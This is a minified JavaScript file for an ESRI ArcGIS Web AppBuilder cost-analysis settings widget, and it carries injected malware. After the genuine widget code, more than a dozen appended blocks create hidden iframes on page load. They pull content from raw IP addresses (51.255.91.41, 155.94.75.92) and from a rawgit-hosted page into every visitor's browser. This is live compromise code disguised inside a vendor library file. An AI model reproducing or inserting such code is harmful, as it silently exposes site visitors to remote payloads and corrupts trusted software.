// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/CostAnalysis/setting/CostingInfo.html":'\x3cdiv class\x3d"esriCTTabNode"\x3e\r\n    \x3c!--Add Layers section --\x3e\r\n    \x3cdiv class\x3d"esriCTTabContainer row"\x3e\r\n        \x3cdiv class\x3d"esriCTManageScenarioButtonContainer"\x3e\r\n            \x3cdiv class\x3d"esriCTMangeScenarios"\x3e\r\n                \x3cdiv data-dojo-attach-point\x3d"btnManageScenarios" \r\n                class\x3d"esriCTBtnAddSection esriCTEllipsis"\x3e\r\n                    \x3cspan class\x3d"esriCTBtnAddIcon"\x3e\x3c/span\x3e\r\n                    \x3cspan class\x3d"esriCTBtnAddLabel esriCTEllipsis"\x3e${nls.costingInfo.manageScenariosTitle}\x3c/span\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTHidden esriCTNoEditableLayersAvailable" data-dojo-attach-point\x3d"noEditableLayersAvailable"\x3e\r\n                    ${nls.costingInfo.noEditableLayersAvailable}\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"costingTemplateContainer"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dojo/Evented dijit/_WidgetsInTemplateMixin dojo/text!./CostingInfo.html dojo/on dojo/dom-construct dojo/_base/lang dojo/_base/array ./ManageScenarios ./CostingTemplate esri/tasks/query esri/tasks/QueryTask dojo/Deferred dojo/string dojo/dom-class".split(" "),function(n,p,q,r,t,l,u,e,g,v,w,x,y,z,k,m){return n([p,q,r],{templateString:t,_manageScenario:null,totalScenariosCollection:[],costingTemplate:{},_scenarioOptions:[],_geographyOptions:[],costingInfoData:{},
baseClass:"jimu-widget-cost-analysis-costing-info",constructor:function(a){e.mixin(this,a)},postMixInProperties:function(){this.nls.common={};e.mixin(this.nls.common,window.jimuNls.common)},postCreate:function(){this.costingTemplate={};this._manageScenario=null;this.totalScenariosCollection=[];this._scenarioOptions=[];this._geographyOptions=[];this.costingInfoData={};this.inherited(arguments);this._init();this.own(l(this.btnManageScenarios,"click",e.hitch(this,this._manageScenariosBtnClicked)))},
validate:function(){var a=this._validateCostingInfoTabData();return a.isValid?{isValid:!0}:{isValid:!1,errorMessage:a.errorMessage}},getConfig:function(){return{costingInfoData:this.costingInfoData,scenarios:this.totalScenariosCollection}},_init:function(){this._geographyOptions=[{label:this.nls.costingInfo.noneValue,value:""}];this.config.projectSettings&&""!==this.config.projectSettings.costingGeometryLayer&&void 0!==this.config.projectSettings.costingGeometryLayer?this.getGeographyOptions().then(e.hitch(this,
function(){this._createCostingTemplate()})):this._createCostingTemplate()},_createCostingTemplate:function(){var a,b,c=[],c=[this.config.projectSettings.costingGeometryLayer||"",this.config.projectSettings.projectLayer||""];this._getScenarioOptions(this.config.scenarios);a=this.map.itemInfo.itemData.operationalLayers;this._showHideNoLayerMessage(a.length);if(0<Object.keys(this.config.costingInfoSettings).length)for(b in this.config.costingInfoSettings){var d=this._getOperationalLayer(a,b);d&&(c.push(b),
this._createCostingTemplateObj(d))}g.forEach(a,e.hitch(this,function(a){this._checkEditCapabilities(a.layerObject)&&-1===c.indexOf(a.id)&&(a.layerObject.templates.length?this._createCostingTemplateObj(a):a.layerObject.types.length&&this._createCostingTemplateObj(a))}))},_createCostingTemplateObj:function(a){this.costingTemplate[a.id]=new w({nls:this.nls,map:this.map,config:this.config,layer:a,scenarios:this._scenarioOptions,geographies:this._geographyOptions},u.create("div",{},this.costingTemplateContainer))},
_getOperationalLayer:function(a,b){var c;g.some(a,e.hitch(this,function(a){if(a.id===b)return c=a,!0}));return c},_manageScenariosBtnClicked:function(){this._manageScenario=new v({nls:this.nls,map:this.map,config:this.config,existingScenarios:this.totalScenariosCollection});l(this._manageScenario,"okButtonClicked",e.hitch(this,function(a){this._manageScenario.destroy();this._getScenarioOptions(a)}))},_checkEditCapabilities:function(a){return a.capabilities&&-1!==a.capabilities.indexOf("Delete")&&
-1!==a.capabilities.indexOf("Create")&&-1!==a.capabilities.indexOf("Update")&&a.globalIdField?!0:!1},_getScenarioOptions:function(a){var b,c;this._scenarioOptions=[{label:this.nls.costingInfo.noneValue,value:""}];this.totalScenariosCollection=[];g.forEach(a,e.hitch(this,function(a){b="object"===typeof a?a.field:a;this._scenarioOptions.push({label:b,value:b});this.totalScenariosCollection.push(b)}));for(c in this.costingTemplate)this.costingTemplate[c].updateScenarioOptions(this._scenarioOptions)},
getGeographyOptions:function(a,b){var c,d;c=new z;b||(a=this.config.projectSettings.geographyField,b=this.config.projectSettings.costingGeometryLayer);""!==b&&this.layerInfosObj.getLayerInfoById(b)?(b=this.map._layers[b],b=new y(b.url),d=new x,d.outFields=[a],d.returnDistinctValues=!0,d.returnGeometry=!1,d.where="1\x3d1",b.execute(d,e.hitch(this,function(b){this._geographyQueryTaskComplete(b,a);c.resolve(this._geographyOptions)}),e.hitch(this,function(){this._geographyOptions=[];this._geographyOptions.push({label:this.nls.costingInfo.noneValue,
value:""});c.resolve(this._geographyOptions)}))):(this._geographyOptions=[],this._geographyOptions.push({label:this.nls.costingInfo.noneValue,value:""}),c.resolve(this._geographyOptions));return c.promise},_geographyQueryTaskComplete:function(a,b){this._geographyOptions=[{label:this.nls.costingInfo.noneValue,value:""}];g.forEach(a.features,e.hitch(this,function(a){""!==a.attributes[b]&&null!==a.attributes[b]&&this._geographyOptions.push({label:isNaN(a.attributes[b])?a.attributes[b]:a.attributes[b].toString(),
value:a.attributes[b]})}))},_validateCostingInfoTabData:function(){var a,b,c,d,f,e,h;this.costingInfoData={};for(a in this.costingTemplate)if(e=[],h=[],this.costingTemplate[a]){this.costingInfoData[a]=this.costingTemplate[a].getUpdatedCostingInfo();d=this.costingInfoData[a].length;for(b in this.costingInfoData[a]){f=this.costingInfoData[a][b];-1===h.indexOf(f.featureTemplate)&&h.push(f.featureTemplate);""===f.scenario&&""===f.geography&&-1===e.indexOf(f.featureTemplate)&&e.push(f.featureTemplate);
if(!this.costingTemplate[a].validateCostEquation(f.costEquation))return{isValid:!1,errorMessage:k.substitute(this.nls.costingInfo.requiredCostEquation,{templateName:f.featureTemplate,layerName:this.costingTemplate[a].layer.title})};if(1<d)for(c=parseInt(b,0)+1;c<d;c++){var g;g=this.costingInfoData[a][c];if(f.featureTemplate===g.featureTemplate&&f.scenario===g.scenario&&f.geography===g.geography)return{isValid:!1,errorMessage:k.substitute(this.nls.costingInfo.duplicateTemplateMessage,{layerName:this.costingTemplate[a].layer.title,
templateName:f.featureTemplate})}}}d=0;f=h.length;for(d;d<f;d++)if(-1===e.indexOf(h[d]))return{isValid:!1,errorMessage:k.substitute(this.nls.costingInfo.defaultEquationRequired,{templateName:h[d],layerName:this.costingTemplate[a].layer.title})};if(0===this.costingInfoData[a].length)return{isValid:!1,errorMessage:k.substitute(this.nls.costingInfo.noTemplateAvailable,{layerName:this.costingTemplate[a].layer.title})}}return Object.keys(this.costingInfoData).length?{isValid:!0}:{isValid:!1,errorMessage:k.substitute(this.nls.costingInfo.noLayerMessage,
{tabName:this.nls.costingInfo.tabTitle})}},_updateCostingInfoTable:function(a){var b,c;a.layerId?b=a.layerId:(c=a.lastSelectedId,b=a.currentSelectedLayerId);Object.keys(a).length&&(c?(this.costingTemplate[b]&&this._deleteCostingInfoLayer(b),c&&this._addCostingInfoLayer(c)):a.editable?this._addCostingInfoLayer(b):this.costingTemplate[b]&&this._deleteCostingInfoLayer(b));this._showHideNoLayerMessage(Object.keys(this.costingTemplate).length)},_showHideNoLayerMessage:function(a){0===a?m.remove(this.noEditableLayersAvailable,
"esriCTHidden"):m.add(this.noEditableLayersAvailable,"esriCTHidden")},_deleteCostingInfoLayer:function(a){this.costingTemplate[a].destroyRecursive();delete this.costingTemplate[a];delete this.config.costingInfoSettings[a]},_addCostingInfoLayer:function(a){g.some(this.map.itemInfo.itemData.operationalLayers,e.hitch(this,function(b){if(a===b.id&&this._checkEditCapabilities(b.layerObject))return this._createCostingTemplateObj(b),!0}))},onGeographyFieldUpdate:function(a){for(var b in this.costingTemplate)this.costingTemplate[b].updateGeographyOptions(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});